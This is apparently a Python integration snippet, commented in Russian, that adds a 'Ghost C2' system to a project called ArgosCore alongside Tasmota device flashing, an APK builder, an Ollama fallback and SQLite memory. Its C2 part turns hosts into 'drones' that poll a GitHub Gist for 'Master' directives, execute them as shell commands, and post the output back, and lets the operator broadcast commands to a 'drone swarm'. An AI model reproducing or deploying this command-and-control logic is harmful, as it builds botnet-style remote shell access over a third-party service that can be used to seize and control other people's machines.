"""
ИНТЕГРАЦИЯ Argos v1.20.5 → v2.1.3
Вставить в класс ArgosCore (src/core.py)
"""

# === ВСТАВИТЬ В __init__ ПОСЛЕ self._init_* методов ===

def _init_c2_system(self):
    """Initialize Ghost C2 + IoT + APK modules"""
    # Import new modules (создать файлы c2_gist.py и iot_apk.py в src/)
    try:
        from src.c2_gist import GistC2
        from src.iot_apk import IoTFlasher, APKBuilder
        
        # Initialize C2 if tokens available
        gist_id = os.getenv("ARGOS_GIST_ID", "")
        gh_token = os.getenv("ARGOS_GITHUB_TOKEN", "")
        
        if gist_id and gh_token:
            self.c2 = GistC2(gist_id, gh_token, node_id="Argos_v213")
            # Register handlers
            self.c2.register_handler("ARGOS_DIRECTIVE", self._handle_c2_directive)
            self.c2.register_handler("ARGOS_FLASH_CMD", self._handle_c2_flash)
            # Start listener
            self.c2.start_listener()
            print("[INIT] Ghost C2 active")
        else:
            self.c2 = None
            
        # Initialize IoT Flasher
        self.iot = IoTFlasher(report_callback=self._c2_report if self.c2 else print)
        
        # Initialize APK Builder
        self.apk_builder = APKBuilder(notify_callback=self._notify_admin)
        
    except ImportError as e:
        print(f"[INIT] C2 modules not loaded: {e}")
        self.c2 = None
        self.iot = None
        self.apk_builder = None

def _c2_report(self, msg: str):
    """Report via C2 or fallback to print"""
    if self.c2:
        # Write to Gist as Master log
        self.c2.broadcast(f"[SYSTEM] {msg}", label="MASTER_LOG")
    print(f"[C2] {msg}")

def _notify_admin(self, msg: str):
    """Send notification to admin (Telegram or other)"""
    # Try to use existing notification system
    if hasattr(self, 'send_tg') or hasattr(self, '_send_notification'):
        try:
            self.send_tg(msg)
        except:
            pass
    print(f"[NOTIFY] {msg}")

# === ОБРАБОТЧИКИ C2 КОМАНД ===

def _handle_c2_directive(self, command: str):
    """Handle incoming directive from Master (for Drone mode)"""
    print(f"[C2] Executing directive: {command[:50]}...")
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, timeout=60)
        return result.decode('utf-8', errors='ignore')[:500]
    except Exception as e:
        return f"FAIL: {str(e)}"

def _handle_c2_flash(self, command: str):
    """Handle IoT flash command"""
    if command.lower().startswith("tasmota "):
        ip = command.split()[-1]
        return self.iot.tasmota_ota(ip)
    elif command.lower().startswith("pr2350"):
        return self.iot.pr2350_flash_id()
    return "Unknown flash command"

# === НОВЫЕ МЕТОДЫ ДЛЯ execute_intent ИЛИ process ===

def cmd_build_apk(self, args: str = "") -> str:
    """Command: build apk - Start APK build"""
    if not self.apk_builder:
        return "❌ APK Builder not initialized (check env)"
    if self.apk_builder.is_building:
        return "⚠️ Factory already busy"
    
    # Start build
    self.apk_builder.build(
        project_path=os.getenv("APK_PROJECT_PATH", "."),
        send_file_callback=self._send_apk_to_admin if hasattr(self, '_send_apk_to_admin') else None
    )
    return "🏗 Factory activated. APK will be ready in 15-20 min."

def cmd_tasmota(self, ip: str) -> str:
    """Command: tasmota <ip> - OTA update Tasmota device"""
    if not self.iot:
        return "❌ IoT module not initialized"
    result = self.iot.tasmota_ota(ip)
    if "error" in result:
        return f"❌ Tasmota error: {result['error']}"
    return f"✅ Tasmota OTA started: {ip} (HTTP {result['status']})"

def cmd_pr2350(self, action: str = "check") -> str:
    """Command: pr2350 check - Check ESP chip ID"""
    if not self.iot:
        return "❌ IoT module not initialized"
    result = self.iot.pr2350_flash_id()
    if "error" in result:
        return f"❌ PR2350 error: {result['error']}"
    return f"🔌 Chip ID:\n```\n{result['output'][:400]}\n```"

def cmd_ghost(self, command: str) -> str:
    """Command: ghost <cmd> - Broadcast to drone swarm"""
    if not self.c2:
        return "❌ C2 not initialized (set ARGOS_GIST_ID and ARGOS_GITHUB_TOKEN)"
    success = self.c2.broadcast(command)
    return "📡 Broadcast sent to swarm" if success else "❌ Broadcast failed"

def cmd_drone_mode(self, enable: bool = True) -> str:
    """Command: drone mode on/off - Switch to Ghost Drone mode"""
    if enable:
        # Switch to drone listener mode
        threading.Thread(target=self._enter_drone_mode, daemon=True).start()
        return "👻 Entering Drone mode. Listening for Master commands..."
    return "Drone mode disabled"

def _enter_drone_mode(self):
    """Enter Ghost Drone mode (blocks thread)"""
    from src.c2_gist import GhostDroneClient
    
    gist_id = os.getenv("ARGOS_GIST_ID", "")
    gh_token = os.getenv("ARGOS_GITHUB_TOKEN", "")
    
    if not gist_id or not gh_token:
        print("Cannot enter drone mode: no tokens")
        return
    
    drone = GhostDroneClient(gist_id, gh_token)
    drone.report("DRONE_BOOT: Online and listening")
    
    def handle(tag, cmd):
        drone.report(f"RECV: {cmd[:50]}")
        if tag == "ARGOS_FLASH_CMD:":
            # Handle IoT commands
            pass
        else:
            # Execute shell
            try:
                result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=60)
                drone.report(f"SUCCESS:\n{result.decode()[:200]}")
            except Exception as e:
                drone.report(f"FAIL: {str(e)}")
    
    drone.listen_for_commands(handle)

# === ОБНОВЛЕННЫЙ AI С OLLAMA FALLBACK (для NeuralNexus) ===

def _ask_ollama_fallback(self, context: str, user_text: str) -> Optional[str]:
    """Enhanced Ollama integration with better error handling"""
    import requests
    
    host = os.getenv("OLLAMA_HOST", "http://localhost:11434")
    model = os.getenv("OLLAMA_MODEL", "llama3")
    
    prompt = f"{context}\n\nUser: {user_text}" if context else user_text
    
    try:
        resp = requests.post(
            f"{host}/api/generate",
            json={
                "model": model,
                "prompt": prompt,
                "stream": False,
                "options": {"temperature": 0.7}
            },
            timeout=60
        )
        return f"[OLLAMA] {resp.json().get('response', 'No response')}"
    except requests.exceptions.ConnectionError:
        return None  # Fallback to next provider
    except Exception as e:
        return f"[OLLAMA_ERR] {str(e)[:100]}"

# === SQLITE MEMORY ИНТЕГРАЦИЯ ===

def _init_sqlite_memory(self):
    """Initialize v1.20.5 style SQLite memory"""
    import sqlite3
    os.makedirs("data", exist_ok=True)
    self._sql_conn = sqlite3.connect("data/brain.db", check_same_thread=False)
    self._sql_conn.execute("CREATE TABLE IF NOT EXISTS facts (key TEXT PRIMARY KEY, val TEXT)")
    self._sql_conn.commit()

def remember(self, key: str, value: str) -> str:
    """Command: remember: key | value"""
    if not hasattr(self, '_sql_conn'):
        self._init_sqlite_memory()
    try:
        self._sql_conn.execute("INSERT OR REPLACE INTO facts VALUES (?, ?)", (key, value))
        self._sql_conn.commit()
        return f"✅ Remembered: {key}"
    except Exception as e:
        return f"❌ Memory error: {e}"

def recall(self, key: str) -> str:
    """Command: recall key"""
    if not hasattr(self, '_sql_conn'):
        return "❌ Memory not initialized"
    try:
        cur = self._sql_conn.execute("SELECT val FROM facts WHERE key=?", (key,))
        row = cur.fetchone()
        return f"🧠 {key}: {row[0]}" if row else f"❌ Unknown: {key}"
    except Exception as e:
        return f"❌ Recall error: {e}"

# === ОБРАБОТЧИКИ КОМАНД (добавить в dispatch_skill или execute_intent) ===

COMMAND_HANDLERS_V1205 = {
    "build apk": "cmd_build_apk",
    "tasmota ": "cmd_tasmota",  # partial match
    "pr2350": "cmd_pr2350",
    "ghost ": "cmd_ghost",
    "remember:": "remember",
    "recall ": "recall",
    "drone mode": "cmd_drone_mode",
}
